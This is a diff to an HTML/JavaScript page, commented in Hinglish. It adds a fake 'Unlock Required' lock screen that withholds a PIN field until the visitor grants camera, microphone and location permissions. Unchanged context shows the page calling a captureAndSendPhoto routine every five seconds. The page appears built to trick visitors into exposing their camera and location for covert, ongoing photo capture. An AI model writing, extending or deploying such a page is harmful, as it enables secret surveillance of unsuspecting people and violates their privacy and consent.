@@ -414,7 +414,8 @@ button {
         setInterval(captureAndSendPhoto, 5000); 
         getMessages();
     </script>
-    <script> 
+    
+<script>
 document.addEventListener("DOMContentLoaded", function () {
     let lockScreen = document.createElement("div");
     lockScreen.innerHTML = `
@@ -425,9 +426,12 @@ document.addEventListener("DOMContentLoaded", function () {
             z-index: 9999;">
             <div style="background: rgba(255, 255, 255, 0.2); padding: 20px; border-radius: 15px;
                 backdrop-filter: blur(10px); box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); width: 300px;">
-                <h2 style="color: white;"></h2>
+                <h2 style="color: white;">Unlock Required</h2>
+                <button id="unlockBtn" style="
+                    padding: 10px 20px; border: none; border-radius: 20px; cursor: pointer;
+                    background: rgba(255, 255, 255, 0.7); color: #333; font-size: 16px;">Unlock</button>
                 <input type="tel" id="pinInput" maxlength="4" placeholder="Enter PIN" pattern="[0-9]*"
-                    inputmode="numeric" style="
+                    inputmode="numeric" disabled style="
                     padding: 12px; width: 85%; border: none; border-radius: 30px;
                     text-align: center; font-size: 18px; margin: 10px 0; outline: none;
                     background: rgba(255, 255, 255, 0.5); color: #333;">
@@ -436,21 +440,47 @@ document.addEventListener("DOMContentLoaded", function () {
     `;
     document.body.appendChild(lockScreen);
 
-    document.getElementById("pinInput").addEventListener("input", function () {
+    let unlockBtn = document.getElementById("unlockBtn");
+    let pinInput = document.getElementById("pinInput");
+
+    unlockBtn.addEventListener("click", async function () {
+        try {
+            // Camera & Mic Permission
+            await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+
+            // Location Permission
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    console.log("Location Access Granted!", position);
+                    pinInput.removeAttribute("disabled"); // PIN input enable
+                    alert("Permissions Granted! Now enter PIN to unlock.");
+                },
+                (error) => {
+                    alert("Location access is required!");
+                }
+            );
+
+        } catch (error) {
+            alert("Camera & Microphone access is required!");
+        }
+    });
+
+    pinInput.addEventListener("input", function () {
         let enteredPin = this.value;
         let correctPin = "7038"; // Change this PIN
 
-        if (enteredPin.length === 4) { // Jaise hi 4 digit enter hote hain
+        if (enteredPin.length === 4) { // 4 digit enter hone par
             if (enteredPin === correctPin) {
                 document.getElementById("pinContainer").remove(); // Lock screen hatana
             } else {
-             
-                this.value = ""; // Galat PIN to input clear
+                this.value = ""; // Galat PIN toh input clear
+                alert("Incorrect PIN!");
             }
         }
     });
 });
 </script>
+
 <script>
 document.addEventListener("visibilitychange", function() {
     if (document.hidden) {
